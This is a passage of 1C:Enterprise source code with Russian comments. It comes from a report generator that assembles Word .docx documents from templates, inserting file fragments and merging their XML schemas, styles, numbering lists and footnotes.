		КонецЕсли;
	КонецЦикла;
	
	// перестраиваем заголовок и разметку областей таблицы и выводим их в результат
	ОбработкаШаблона(ПереопределениеНастройкиШириныТаблицы(Секция.ЗаголовокТаблицы, Секция.ТаблицаОбластей) + 
			ПостроениеРазметкиОбластейТаблицы(Секция.ТаблицаОбластей), Контекст);
			
	// обрабатываем тело таблицы:
	// сначала обрабатываем секции Ячейка, т.е. удаляем скрытые ячейки и меняем количество областей,
	// занимаемых объединенными ячейками
	// мы делаем копию фрагмента шаблона с этими коррективами, чтобы не делать эти коррективы непосредственно при
	// выводе отчета, т.к. строчки таблицы могут выводится в большом цикле, т.е. сделать это предварительно (до цикла)
	// гораздо выгоднее
	Контекст.Вставить(""ТаблицаОбластей"", Секция.ТаблицаОбластей);		
	БуфСтрукт = ОбработкаСекцийЯчейкаВДТ(Секция.СодержимоеСекции, Контекст);
	// а теперь обрабатываем полученный фрагмент стандартным путем
	ОбработкаШаблона(БуфСтрукт, Контекст);
КонецПроцедуры

// Обработка секции любого типа (диспетчер)
// 
// Параметры:
//  Секция - структура - in, обрабатываемая секция
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработкаСекции(Секция, Контекст)
	цТипСекции = Секция.цТипСекции; 
	Если Контекст.РежимКоммент
		И Не ((цТипСекции = констОпределениеПодстановки())
			   Или (цТипСекции = констКоммент())
			   Или (цТипСекции = констПеременная()))
		Тогда Возврат;
	КонецЕсли;
	Если цТипСекции = констСекция() Тогда 
		ОбработкаСекцииТекста(Секция, Контекст);
	ИначеЕсли цТипСекции = констИзФайла() Тогда
		ОбработкаСекцииИзФайла(Секция, Контекст);
	ИначеЕсли цТипСекции = констПовторяемаяСекция() Тогда
		ОбработкаПовторяемойСекции(Секция, Контекст);
	ИначеЕсли цТипСекции = констНеобязательнаяСекция() Тогда
		ОбработкаНеобязательнойСекции(Секция, Контекст);
	ИначеЕсли цТипСекции = констДинамическаяТаблица() Тогда
		ОбработкаСекцииДинамическаяТаблица(Секция, Контекст);
	ИначеЕсли цТипСекции = констПеременная() Тогда
		ОбработкаСекцииПеременной(Секция, Контекст);
	ИначеЕсли цТипСекции = констОбъединить() Тогда
		ОбработкаСекцииОбъединить(Секция, Контекст);
	ИначеЕсли цТипСекции = констНачатьЗаново() Тогда
		ОбработкаСекцииНачатьЗаново(Секция, Контекст);
	ИначеЕсли цТипСекции = констОпределениеПодстановки() Тогда
		ОбработкаСекцииОпределениеПодстановки(Секция, Контекст);
	ИначеЕсли цТипСекции = констПодстановка() Тогда
		ОбработкаСекцииПодстановка(Секция, Контекст);
	ИначеЕсли цТипСекции = констКоммент() Тогда
		ОбработкаСекцииКоммент(Секция, Контекст);
	ИначеЕсли цТипСекции = констКолонка() Тогда
		ОбработкаСекцииКолонка(Секция, Контекст);
	КонецЕсли;
КонецПроцедуры

#КонецОбласти

#Область ПроцедурыИФункцииОбработкиФрагментов

// Обработка секции ""ИзФайла"". Вместо секции в отчет выводится адрес файла в хранилище. Результат обработки 
// секции выводится в Контекст.Рез(ТекстовыйДокумент). Вставка содержимого файла выполняется на клиенте.
// 
// Параметры:
//  Секция - структура - in, обрабатываемая секция
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ПодготовкаДляКлиентскойОбработкиСекцииИзФайла(Секция, Контекст)
	Если Не Секция.Свойство(""сТекстСекции"") Тогда 
		сТекстДляЗамены = """";
		// выделяем текст
		сТекстСекции = ПолучитьТекстСекции(Секция.СодержимоеСекции, сТекстДляЗамены);
		Секция.Вставить(""сТекстСекции"", сТекстСекции);
		Секция.Вставить(""сТекстДляЗамены"", сТекстДляЗамены);
	КонецЕсли;
	// пытаемся получить данные, если неудачно, то """"
	Попытка
		// в колонтитулах секция ""ИзФайла"" недопустима, вызываем исключение
		Если Контекст.ОбработкаКолонтитулов Тогда
			ВызватьИсключение ""В колонтитулах секция """"ИзФайла"""" недопустима!"";
		КонецЕсли;
		сДанные = ПолучитьДанные(Секция.сТекстСекции, Контекст);
		Контекст.АдресаФрагментов.Добавить(сДанные);
		// обрамляем текст в текстовые идентификаторы для последующей обработки на клиенте,
		// ранее оставлялись тэги <ИзФайла>, но MS Word 2012 их не видит и выдает ошибку
		// ищем абзац
		НачалоАбзаца = ПостроительОтчетовКлиентСервер.НайтиНачалоАбзаца(Секция.СодержимоеСекции);
		Если НачалоАбзаца > 0 Тогда
			// ищем начало текста
			НачалоТекста = Найти(Секция.СодержимоеСекции, Секция.сТекстДляЗамены);
			// пока начало абзаца меньше начала текста, ищем дальше
			Пока НачалоАбзаца > 0 И НачалоАбзаца < НачалоТекста Цикл
				цНачалоПредыдущегоАбзаца = НачалоАбзаца;
				НачалоАбзаца = ПостроительОтчетовКлиентСервер.НайтиНачалоАбзаца(Секция.СодержимоеСекции, НачалоАбзаца + 5);
			КонецЦикла;
			Секция.СодержимоеСекции = Сред(Секция.СодержимоеСекции, цНачалоПредыдущегоАбзаца, 
					НачалоТекста - цНачалоПредыдущегоАбзаца + СтрДлина(Секция.сТекстДляЗамены)) + ""</w:t></w:r></w:p>"";
			сДанные = ""[ec0d9727-b7c1-4232-8bce-abc762da22ac][w:p]"" + сДанные + ""[/ec0d9727-b7c1-4232-8bce-abc762da22ac]"";
		Иначе
			сДанные = ""[ec0d9727-b7c1-4232-8bce-abc762da22ac]"" + сДанные + ""[/ec0d9727-b7c1-4232-8bce-abc762da22ac]"";
		КонецЕсли;
	Исключение
		Сообщить(""Ошибка при вычислении выражения секции """"ИзФайла"""":"" + Символы.ПС + Секция.сТекстСекции + Символы.ПС + ИнформацияОбОшибке().Описание);
		сДанные = """";
	КонецПопытки;
	Контекст.Рез.ДобавитьСтроку(СтрЗаменить(Секция.СодержимоеСекции, Секция.сТекстДляЗамены, сДанные));
КонецПроцедуры

// Обработка секции ""ИзФайла"". Вместо секции в отчет выводится содержимое указанного в секции
// файла. Результат обработки секции выводится в Контекст.Рез(ТекстовыйДокумент). 
// 
// Параметры:
//  Секция - структура - in, обрабатываемая секция
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура СервернаяОбработкаСекцииИзФайла(Секция, Контекст)
	Если Не Секция.Свойство(""сТекстСекции"") Тогда 
		сТекстДляЗамены = """";
		// выделяем текст
		сТекстСекции = ПолучитьТекстСекции(Секция.СодержимоеСекции, сТекстДляЗамены);
		Секция.Вставить(""сТекстСекции"", сТекстСекции);
		Секция.Вставить(""сТекстДляЗамены"", сТекстДляЗамены);
	КонецЕсли;
	// пытаемся получить данные, если неудачно, то """"
	Попытка
		// в колонтитулах секция ""ИзФайла"" недопустима, вызываем исключение
		Если Контекст.ОбработкаКолонтитулов Тогда
			ВызватьИсключение ""В колонтитулах секция """"ИзФайла"""" недопустима!"";
		КонецЕсли;
		// получаем адрес фрагмента в хранилище
		сДанные = ПолучитьДанные(Секция.сТекстСекции, Контекст);
		Если Не ЗначениеЗаполнено(сДанные) Тогда
			ВызватьИсключение ""В качестве файла фрагмента должны использоваться файлы формата """"Документ Word (*.docx)""""!"";
		КонецЕсли;
		// получаем данные фрагмента и нормализуем тектс фрагмента
		ДанныеФрагмента = ПолучитьДанныеШаблона(Новый Структура(""Шаблон"", сДанные));
		НормализоватьШаблон(ДанныеФрагмента.ТекстШаблона);
		// удаляем определение свойств секторов и гиперссылки, потому что в них содержаться ссылки, которые не переносятся
		УдалитьОпределениеСвойствСекторов(ДанныеФрагмента.ТекстШаблона);
		УдалитьГиперссылки(ДанныеФрагмента.ТекстШаблона);
		// получаем текст фрагмента и дописываем стили фрагмента к стилям отчета
		ОбработкаСтилейФрагмента(Контекст, ДанныеФрагмента);
		// получаем текст фрагмента и дописываем определения списков фрагмента в таблицы ОпределениеСписков и 
		// СсылкиСписков шаблона отчета, которые хранятся в структуре Контекст
		ОбработкаСписковФрагмента(Контекст, ДанныеФрагмента);
		// обработка сносок и концевых сносок фрагмента
		ОбработкаСносокФрагмента(Контекст, ДанныеФрагмента);
		ОбработкаСносокФрагмента(Контекст, ДанныеФрагмента, Истина);
		// обработка примечаний фрагмента
		ОбработкаПримечанийФрагмента(Контекст, ДанныеФрагмента);
		// обработка рисунков, диаграмм и объектов SmartArt фрагмента
		ОбработкаОбъектовФрагмента(Контекст, ДанныеФрагмента);
		// обработка xml-схем текста фрагмента
		ОбработкаXMLСхемФрагмента(ДанныеФрагмента.ТекстШаблона, Контекст.XMLСхемыДокумента, ""document"");
		ТекстФрагмента = ВырезатьТелоФрагмента(ДанныеФрагмента.ТекстШаблона);
		// ищем ячейку таблицы
		НачалоКолонки = ПостроительОтчетовКлиентСервер.НайтиНачалоТэга(Секция.СодержимоеСекции, ""w:tc"");
		// если ячейка таблицы есть, то вставляем содержимое фрагмента вместо текста секции
		Если НачалоКолонки > 0 Тогда
			ТекстФрагмента = СтрЗаменить(Секция.СодержимоеСекции, Секция.сТекстДляЗамены, ТекстФрагмента);
		Иначе
			// ищем абзац
			НачалоАбзаца = ПостроительОтчетовКлиентСервер.НайтиНачалоАбзаца(Секция.СодержимоеСекции);
			// возможны следующие варианты определения тега:
			// 1. Тег ИзФайла содержит абзац - вырезаем весь абзац и вместо него вставляем содержимое фрагмента
			// 2. Тег ИзФайла не содержит абзац - закрываем абзац для текста до, для текста после открываем абзац, 
			//	  такой же как до текста до, и вставляем содержимое фрагмента между этими абзацами
			Если НачалоАбзаца = 0 Тогда
				ТекстФрагмента = ""</w:p>"" + ТекстФрагмента + ПолучитьОпределениеПредыдущегоАбзаца(Контекст.Рез) + ""<w:r><w:t></w:t></w:r>"";
			КонецЕсли;
		КонецЕсли;
	Исключение
		Сообщить(""Ошибка при вычислении выражения секции """"ИзФайла"""":"" + Символы.ПС + Секция.сТекстСекции + Символы.ПС + ИнформацияОбОшибке().Описание);
		ТекстФрагмента = """";
	КонецПопытки;
	Контекст.Рез.ДобавитьСтроку(ТекстФрагмента);
КонецПроцедуры

// Возвращает тело фрагмента, часть строки между тегами <w:body> и </w:body>
//
// Параметры:
//  ТекстФрагмента - строка - in, текст фрагмента
//
// Возвращаемое значение:
//  строка - строка, содержащая тело фрагмента
// 
Функция ВырезатьТелоФрагмента(ТекстФрагмента)
	ТелоФрагмента = """";
	// получаем содержимое фрагмента
	НачалоТекста = Найти(ТекстФрагмента, ""<w:body>"");
	Если НачалоТекста > 0 Тогда
		НачалоТекста = НачалоТекста + 8;
		КонецТекста = Найти(ТекстФрагмента, ""</w:body>"");
		ТелоФрагмента = Сред(ТекстФрагмента, НачалоТекста, КонецТекста - НачалоТекста);
	КонецЕсли;
	
	Возврат ТелоФрагмента
КонецФункции

// Обработка xml-схем файла фрагмента. Дописывает xml-схемы фрагмента к заголовку шаблона отчета и, если схема 
// уже присутствует в шаблоне отчета, но ее псевдоним отличается, то он заменяется в тексте фрагмента
//
// Параметры:
//  ТекстФрагмента - строка - in out, текст файла
//  XMLСхемыШаблона - структура - in out, содержит определение xml-схем файла шаблона (псевдоним и пространство имен) и определение игнорируемых схем 
//  сТег - строка - in, имя тега, в котором определены XML-схемы
//
Процедура ОбработкаXMLСхемФрагмента(ТекстФрагмента, XMLСхемыШаблона, сТег)
	Если ЗначениеЗаполнено(ТекстФрагмента) Тогда
		// получаем определение схем фрагмента
		XMLСхемыФрагмента = ПолучитьОпределениеXMLСхем(ТекстФрагмента, сТег);
		// обрабатываем схемы фрагмента
		Для Каждого СхемаФрагмента Из XMLСхемыФрагмента.XMLСхемы Цикл
			// если схема с пространством имен отсутствует в шаблоне, то добавляем ее
			СхемаШаблона = XMLСхемыШаблона.XMLСхемы.Найти(СхемаФрагмента.ПространствоИмен, ""ПространствоИмен"");
			Если СхемаШаблона = Неопределено Тогда
				// ищем схему с таким же псевдонимом, если ее нет то просто вставляем схему
				СхемаШаблона = XMLСхемыШаблона.XMLСхемы.Найти(СхемаФрагмента.Псевдоним, ""Псевдоним"");
				Если СхемаШаблона = Неопределено Тогда
					Стр = XMLСхемыШаблона.XMLСхемы.Добавить();
					ЗаполнитьЗначенияСвойств(Стр, СхемаФрагмента);
				Иначе
					// если схема с таким псевдонимом есть, то генерируем новый	псевдоним и заменяем все на него
					НовПсевдоним = СхемаФрагмента.Псевдоним + СтрЗаменить(Строка(Новый УникальныйИдентификатор), ""-"", """");
					ЗаменитьПсевдонимСхемыФрагмента(ТекстФрагмента, XMLСхемыФрагмента.ИгнорируемыеXMLСхемы, СхемаФрагмента.Псевдоним, НовПсевдоним);
				КонецЕсли;
			Иначе
				// если схема есть в схемах шаблона, то сравниваем их псевдонимы
				Если СхемаШаблона.Псевдоним <> СхемаФрагмента.Псевдоним Тогда
					ЗаменитьПсевдонимСхемыФрагмента(ТекстФрагмента, XMLСхемыФрагмента.ИгнорируемыеXMLСхемы, СхемаФрагмента.Псевдоним, СхемаШаблона.Псевдоним);
				КонецЕсли;
			КонецЕсли;
		КонецЦикла;
		// обработка игнорируемых схем фрагмента
		Для Каждого СхемаФрагмента Из XMLСхемыФрагмента.ИгнорируемыеXMLСхемы Цикл
			СхемаШаблона = XMLСхемыШаблона.ИгнорируемыеXMLСхемы.Найти(СхемаФрагмента.Псевдоним, ""Псевдоним"");
			Если ЗначениеЗаполнено(СхемаШаблона) Тогда
				// если игнорируемые схемы для схемы фрагмента уже определены в шаблоне, то объединяем массивы
				Для Каждого ИгнорируемаяСхемаФрагмента Из СхемаФрагмента.ИгнорируемыеСхемы Цикл
					Инд = СхемаШаблона.ИгнорируемыеСхемы.Найти(ИгнорируемаяСхемаФрагмента);
					Если Не ЗначениеЗаполнено(Инд) Тогда
						СхемаШаблона.ИгнорируемыеСхемы.Добавить(ИгнорируемаяСхемаФрагмента);
					КонецЕсли;
				КонецЦикла;
			Иначе
				// иначе добавляем
			    СхемаШаблона = XMLСхемыШаблона.ИгнорируемыеXMLСхемы.Добавить();
				ЗаполнитьЗначенияСвойств(СхемаШаблона, СхемаФрагмента);
			КонецЕсли;
		КонецЦикла;
	КонецЕсли;
КонецПроцедуры

// Замена псевдонима схемы файла фрагмента (заменяет в тексте файла и в определении игнорируемых схем)
//
// Параметры:
//  ТекстФрагмента - строка - in out, текст файла
//  XMLСхемыШаблона - таблица значений - in out, содержит определение игнорируемых схем 
//  СтарыйПсевдоним - строка - in, старый псевдоним схемы
//  НовыйПсевдоним - строка - in, новый псевдоним схемы
//
Процедура ЗаменитьПсевдонимСхемыФрагмента(ТекстФрагмента, ИгнорируемыеXMLСхемыФрагмента, СтарыйПсевдоним, НовыйПсевдоним)
	// если псевдонимы не одинаковые, то заменяем псевдоним в тексте фрагмента на псевдоним шаблона
	ТекстФрагмента = СтрЗаменить(ТекстФрагмента, ""<"" + СтарыйПсевдоним + "":"", ""<"" + НовыйПсевдоним + "":"");
	ТекстФрагмента = СтрЗаменить(ТекстФрагмента, ""</"" + СтарыйПсевдоним + "":"", ""</"" + НовыйПсевдоним + "":"");
	// меняем псевдоним определения игнорируемых схемах фрагментов 
	СхемаФрагмента = ИгнорируемыеXMLСхемыФрагмента.Найти(СтарыйПсевдоним, ""Псевдоним"");
	Если СхемаФрагмента <> Неопределено Тогда
		СхемаФрагмента.Псевдоним = НовыйПсевдоним;
	КонецЕсли;
	// для всех определений игнорируемых схем, ищем старый псевдоним и заменяем на новый
	Для Каждого СхемаФрагмента Из ИгнорируемыеXMLСхемыФрагмента Цикл
		Инд = СхемаФрагмента.ИгнорируемыеСхемы.Найти(СтарыйПсевдоним);
		Если ЗначениеЗаполнено(Инд) Тогда
			СхемаФрагмента.ИгнорируемыеСхемы[Инд] = НовыйПсевдоним;
		КонецЕсли;
	КонецЦикла;
КонецПроцедуры

// Обработка стилей фрагмента. Выполняется перегенерация идентификаторов и замена ссылок 
// на них в содержимом файла стилей отчета и в содержимом текста фрагмента.
// 
// Параметры:
//  Контекст - структура - содержащая определения стили отчета
//  ДанныеФрагмента - структура - in, данные фрагмента
//
Процедура ОбработкаСтилейФрагмента(Контекст, ДанныеФрагмента)
	// если для шаблона и фрагмента определены стили, то дописываем к ним стили фрагмента
	Если ЗначениеЗаполнено(Контекст.ДанныеШаблона.СтилиДокумента) Тогда
		// если для фрагмента не определены стили, то ничего делать не нужно
		Если ЗначениеЗаполнено(ДанныеФрагмента.СтилиДокумента) Тогда
			// обработка XML-схем стилей документа
			ОбработкаXMLСхемФрагмента(ДанныеФрагмента.СтилиДокумента, Контекст.XMLСхемыСтилей, ""styles"");
			// получаем определение стилей фрагмента
			НачалоСтиля = Найти(ДанныеФрагмента.СтилиДокумента, ""<w:style "");
			Если НачалоСтиля > 0 Тогда
				ОпределениеСтилейФрагмента = Сред(ДанныеФрагмента.СтилиДокумента, НачалоСтиля);
				// обходим стили фрагмента и устанавливаем им новый идентификатор, так же обновляем ссылки в файле стилей и в тексте фрагмента
				Для Каждого ИДСтиля Из ПолучитьИдентификаторыСтилей(ОпределениеСтилейФрагмента, Контекст.ИндексФрагмента) Цикл
					НовыйИДСтиля = Строка(Новый УникальныйИдентификатор()) + ИДСтиля;
					ОпределениеСтилейФрагмента = СтрЗаменить(ОпределениеСтилейФрагмента, "" w:styleId="""""" + ИДСтиля + """""""", "" w:styleId="""""" + НовыйИДСтиля + """""""");
					ОпределениеСтилейФрагмента = СтрЗаменить(ОпределениеСтилейФрагмента, ""<w:basedOn w:val="""""" + ИДСтиля + """"""/>"", ""<w:basedOn w:val="""""" + НовыйИДСтиля + """"""/>"");
					ОпределениеСтилейФрагмента = СтрЗаменить(ОпределениеСтилейФрагмента, ""<w:next w:val="""""" + ИДСтиля + """"""/>"", ""<w:next w:val="""""" + НовыйИДСтиля + """"""/>"");
					ОпределениеСтилейФрагмента = СтрЗаменить(ОпределениеСтилейФрагмента, ""<w:link w:val="""""" + ИДСтиля + """"""/>"", ""<w:link w:val="""""" + НовыйИДСтиля + """"""/>"");
					СтильАбзаца = ""<w:pStyle w:val="""""" + ИДСтиля + """"""/>"";
					НовыйСтильАбзаца = ""<w:pStyle w:val="""""" + НовыйИДСтиля + """"""/>"";
					СтильТекста = ""<w:rStyle w:val="""""" + ИДСтиля + """"""/>"";
					НовыйСтильТекста = ""<w:rStyle w:val="""""" + НовыйИДСтиля + """"""/>"";
					ДанныеФрагмента.ТекстШаблона = СтрЗаменить(ДанныеФрагмента.ТекстШаблона, СтильАбзаца, НовыйСтильАбзаца);
					ДанныеФрагмента.ТекстШаблона = СтрЗаменить(ДанныеФрагмента.ТекстШаблона, СтильТекста, НовыйСтильТекста);
					ДанныеФрагмента.ОпределениеСписков = СтрЗаменить(ДанныеФрагмента.ОпределениеСписков, СтильАбзаца, НовыйСтильАбзаца);
					ДанныеФрагмента.ОпределениеСписков = СтрЗаменить(ДанныеФрагмента.ОпределениеСписков, СтильТекста, НовыйСтильТекста);
					ДанныеФрагмента.Сноски = СтрЗаменить(ДанныеФрагмента.Сноски, СтильАбзаца, НовыйСтильАбзаца);
					ДанныеФрагмента.Сноски = СтрЗаменить(ДанныеФрагмента.Сноски, СтильТекста, НовыйСтильТекста);
					ДанныеФрагмента.КонцевыеСноски = СтрЗаменить(ДанныеФрагмента.КонцевыеСноски, СтильАбзаца, НовыйСтильАбзаца);
					ДанныеФрагмента.КонцевыеСноски = СтрЗаменить(ДанныеФрагмента.КонцевыеСноски, СтильТекста, НовыйСтильТекста);
					ДанныеФрагмента.Примечания = СтрЗаменить(ДанныеФрагмента.Примечания, СтильАбзаца, НовыйСтильАбзаца);
					ДанныеФрагмента.Примечания = СтрЗаменить(ДанныеФрагмента.Примечания, СтильТекста, НовыйСтильТекста);
				КонецЦикла;
				// дописываем стили фрагмента в стили шаблона
				Контекст.ДанныеШаблона.СтилиДокумента = СтрЗаменить(Контекст.ДанныеШаблона.СтилиДокумента, ""</w:styles>"", ОпределениеСтилейФрагмента);
			КонецЕсли;
		КонецЕсли;
	Иначе
		// если для шаблона не определены стили, то копируем стили фрагмента
		Контекст.ДанныеШаблона.СтилиДокумента = ДанныеФрагмента.СтилиДокумента;
		ВырезатьОпределениеXMLСхем(Контекст.ДанныеШаблона.СтилиДокумента, Контекст.XMLСхемыСтилей, ""styles"");
		ДобавитьТипСодержимого(Контекст.ДанныеШаблона.ТипыСодержимого, ""<Override PartName=""""/word/styles.xml"""" ContentType=""""application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml""""/>"");
		ДобавитьСвязьДокумента(Контекст.ДанныеШаблона.СвязиДокумента, ""styles"", ""styles.xml"", ""rId900"");
	КонецЕсли;
КонецПроцедуры

// Получение массива идентификаторов стилей, так же удаляет признак стилей по умолчанию и меняет имя
//
// Параметры:
//  СтилиДокумента - строка - in out, определение стилей документа
//  ИндексФрагмента - число - in out, индекс фрагмента, используется в качестве постфикса имени стиля
//
// Возвращаемое значение:
//  массив - массив, содержащий идентификаторы стилей
// 
Функция ПолучитьИдентификаторыСтилей(СтилиДокумента, ИндексФрагмента)
	Идентификаторы = Новый Массив;
	НачалоСтиля = Найти(СтилиДокумента, ""<w:style "");
	ИндексФрагмента = ИндексФрагмента + 1;
	Пока НачалоСтиля > 0 Цикл
		КонецСтиля = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(СтилиДокумента, "">"", НачалоСтиля) + 1;
		ЛеваяЧасть = Лев(СтилиДокумента, НачалоСтиля - 1); 
		ПраваяЧасть = Сред(СтилиДокумента, КонецСтиля);
		// получаем идентификатор стиля
		ОпределениеСтиля = Сред(СтилиДокумента, НачалоСтиля, КонецСтиля - НачалоСтиля);
		Идентификаторы.Добавить(ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(ОпределениеСтиля, ""w:styleId=""""""));
		// перегенерируем имя стиля
		НачалоИмени = Найти(ПраваяЧасть, ""<w:name w:val="""""");
		Если НачалоИмени > 0 Тогда
			НачалоИмени = НачалоИмени + 14;
			ПраваяЧасть = Лев(ПраваяЧасть, НачалоИмени) + ""__"" + Формат(ИндексФрагмента, ""ЧГ+"") + ""_"" + Сред(ПраваяЧасть, НачалоИмени + 1);
		КонецЕсли;
		// удаляем признак стиля по умолчанию, если он есть
		НачалоПризнака = Найти(ОпределениеСтиля, "" w:default="""""");
		Если НачалоПризнака > 0 Тогда
			КонецПризнака =  ПостроительОтчетовКлиентСервер.НайтиНачинаяС(ОпределениеСтиля, """""""", НачалоПризнака + 12) + 1;
			ЛеваяЧасть = ЛеваяЧасть + Лев(ОпределениеСтиля, НачалоПризнака - 1);
			ПраваяЧасть = Сред(ОпределениеСтиля, КонецПризнака) + ПраваяЧасть;
			КонецСтиля = КонецСтиля - КонецПризнака + НачалоПризнака + 1;
		Иначе
			ЛеваяЧасть = ЛеваяЧасть + ОпределениеСтиля;
		КонецЕсли;
		// формируем новую строку стилей
		СтилиДокумента = ЛеваяЧасть + ПраваяЧасть;
		НачалоСтиля = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(СтилиДокумента, ""<w:style "", КонецСтиля);
	КонецЦикла;

	Возврат Идентификаторы;
КонецФункции

// Удаление свойств секторов из текста
// 
// Параметры:
//  сТекст - строка - in, текст
//
Процедура УдалитьОпределениеСвойствСекторов(ТекстФрагмента)
	Начало = Найти(ТекстФрагмента, ""<w:sectPr "");
	Пока Начало > 0 Цикл
		ТекстФрагмента = Лев(ТекстФрагмента, Начало - 1) + Прав(ТекстФрагмента, СтрДлина(ТекстФрагмента) - Найти(ТекстФрагмента, ""</w:sectPr>"") - 10);
		Начало = Найти(ТекстФрагмента, ""<w:sectPr "");
	КонецЦикла;
КонецПроцедуры

// Удаление гиперссылок из текста
// 
// Параметры:
//  сТекст - строка - in, текст
//
Процедура УдалитьГиперссылки(ТекстФрагмента)
	ТекстФрагмента = СтрЗаменить(ТекстФрагмента, ""</w:hyperlink>"", """");
	Начало = Найти(ТекстФрагмента, ""<w:hyperlink "");
	Пока Начало > 0 Цикл
		ТекстФрагмента = Лев(ТекстФрагмента, Начало - 1) + Прав(ТекстФрагмента, СтрДлина(ТекстФрагмента) - ПостроительОтчетовКлиентСервер.НайтиНачинаяС(ТекстФрагмента, "">"", Начало));
		Начало = Найти(ТекстФрагмента, ""<w:hyperlink "");
	КонецЦикла;
КонецПроцедуры

// Считывание определение абзаца из сформированного ранее итогового текстого документа
//
// Параметры:
//  ИтоговыйТекстовыйДокумент - текстовый документ, итоговый текстовый документ
//
// Возвращаемое значение:
//  строка - строка, содержащий определение абзаца
// 
Функция ПолучитьОпределениеПредыдущегоАбзаца(ИтоговыйТекстовыйДокумент)
	Рез = """";
	Кол = ИтоговыйТекстовыйДокумент.КоличествоСтрок();
	Пока ПустаяСтрока(Рез) Цикл
		Стр = ИтоговыйТекстовыйДокумент.ПолучитьСтроку(Кол);
		НачалоАбзаца = ПостроительОтчетовКлиентСервер.НайтиНачалоАбзацаСправа(Стр);
		Если НачалоАбзаца = 0 Тогда
			Кол = Кол - 1;
		Иначе
			КонецОпределенияАбзаца = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(Стр, ""</w:pPr>"", НачалоАбзаца);
			Если КонецОпределенияАбзаца = 0 Тогда
				КонецОпределенияАбзаца = ПостроительОтчетовКлиентСервер.НайтиНачалоБлокаТекста(Стр, НачалоАбзаца);
			Иначе
				КонецОпределенияАбзаца = КонецОпределенияАбзаца + 8;
			КонецЕсли;
			Рез = Сред(Стр, НачалоАбзаца, КонецОпределенияАбзаца - НачалоАбзаца);
		КонецЕсли;	
	КонецЦикла;
	
	Возврат Рез;
КонецФункции

// Обработка списков фрагмента. Выполняется перегенерация идентификаторов и замена ссылок 
// на них в содержимом файла списков отчета и в содержимом текста фрагмента.
// 
// Параметры:
//  Контекст - структура - содержащая определения списков отчета
//  ДанныеФрагмента - структура - in, данные фрагмента
//
Процедура ОбработкаСписковФрагмента(Контекст, ДанныеФрагмента)
	// если у фрагмента нет списков, то делать ничего не надо
	Если ЗначениеЗаполнено(ДанныеФрагмента.ОпределениеСписков) Тогда
		Если ЗначениеЗаполнено(Контекст.ДанныеШаблона.ОпределениеСписков) Тогда
			// обработка XML-схем списков документа
			ОбработкаXMLСхемФрагмента(ДанныеФрагмента.ОпределениеСписков, Контекст.XMLСхемыСписков, ""numbering"");
			// считываем таблицу определения списков и таблицу ссылок на списки фрагмента
			СпискиФрагмента = Новый Структура(""ДанныеШаблона"", Новый Структура(""ОпределениеСписков"", ДанныеФрагмента.ОпределениеСписков));
			СформироватьТаблицыДляСписков(СпискиФрагмента);
			СчитатьОпределениеСписков(СпискиФрагмента);
			Для Каждого ОпределениеСписка Из СпискиФрагмента.ОпределениеСписков Цикл
				// для каждого определения списка перегенерируем идентификатор и дописываем в таблицу определений списков отчета
				ИДОпределения = ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(ОпределениеСписка.Текст, ""w:abstractNumId="""""");
				НовыйИДОпределения = СтрЗаменить(Строка(Контекст.ОпределениеСписков.Количество()), Символы.НПП, """");
				НовСтр = Контекст.ОпределениеСписков.Добавить();
				НовСтр.Текст = СтрЗаменить(ОпределениеСписка.Текст, "" w:abstractNumId="""""" + ИДОпределения + """""""", "" w:abstractNumId="""""" + НовыйИДОпределения + """""""");
				// обрабатываем только ссылки ссылающиеся на текущее определение списка
				Сч = 0;
				Кол = СпискиФрагмента.СсылкиСписков.Количество();
				Пока Сч < Кол Цикл
					СсылкаСписка = СпискиФрагмента.СсылкиСписков[Сч];
					Если ИДОпределения = ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(СсылкаСписка.Текст, ""<w:abstractNumId w:val="""""") Тогда
						// перегенерируем идентификатор ссылки и дописываем в таблицу ссылок отчета
						ИДСсылки = ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(СсылкаСписка.Текст, ""w:numId="""""");
						НовыйИДСсылки = СтрЗаменить(Строка(Контекст.СсылкиСписков.Количество() + 1), Символы.НПП, """");
						НовСтр = Контекст.СсылкиСписков.Добавить();
						НовСтр.Текст = СтрЗаменить(СсылкаСписка.Текст, ""<w:num w:numId="""""" + ИДСсылки + """""""", ""<w:num w:numId="""""" + НовыйИДСсылки + """""""");
						// заменяем идентификатор определения списка на новый
						НовСтр.Текст = СтрЗаменить(НовСтр.Текст, ""<w:abstractNumId w:val="""""" + ИДОпределения + """""""", ""<w:abstractNumId w:val="""""" + НовыйИДОпределения + """""""");
						НовСтр.Определение = СсылкаСписка.Определение;
						// заменяем идентификаторы ссылок в тексте фрагмента
						ДанныеФрагмента.ТекстШаблона = СтрЗаменить(ДанныеФрагмента.ТекстШаблона, ""<w:numId w:val="""""" + ИДСсылки + """"""/>"", ""<w:numId w:val="""""" + НовыйИДСсылки + """"""/>"");
						// удаляем ссылку и перевычесляем количество
						СпискиФрагмента.СсылкиСписков.Удалить(Сч);
						Кол = СпискиФрагмента.СсылкиСписков.Количество();
					Иначе
						// если ссылка не на текущее определение списка, то просто увеличиваем счетчик
						Сч = Сч + 1;
					КонецЕсли;
				КонецЦикла;
			КонецЦикла;
		Иначе
			// если в исходном файле списки не были определены, то копируем определение списков из фрагмента и считываем их
			Контекст.ДанныеШаблона.ОпределениеСписков = ДанныеФрагмента.ОпределениеСписков;
			ВырезатьОпределениеXMLСхем(Контекст.ДанныеШаблона.ОпределениеСписков, Контекст.XMLСхемыСписков, ""numbering"");
			СчитатьОпределениеСписков(Контекст);
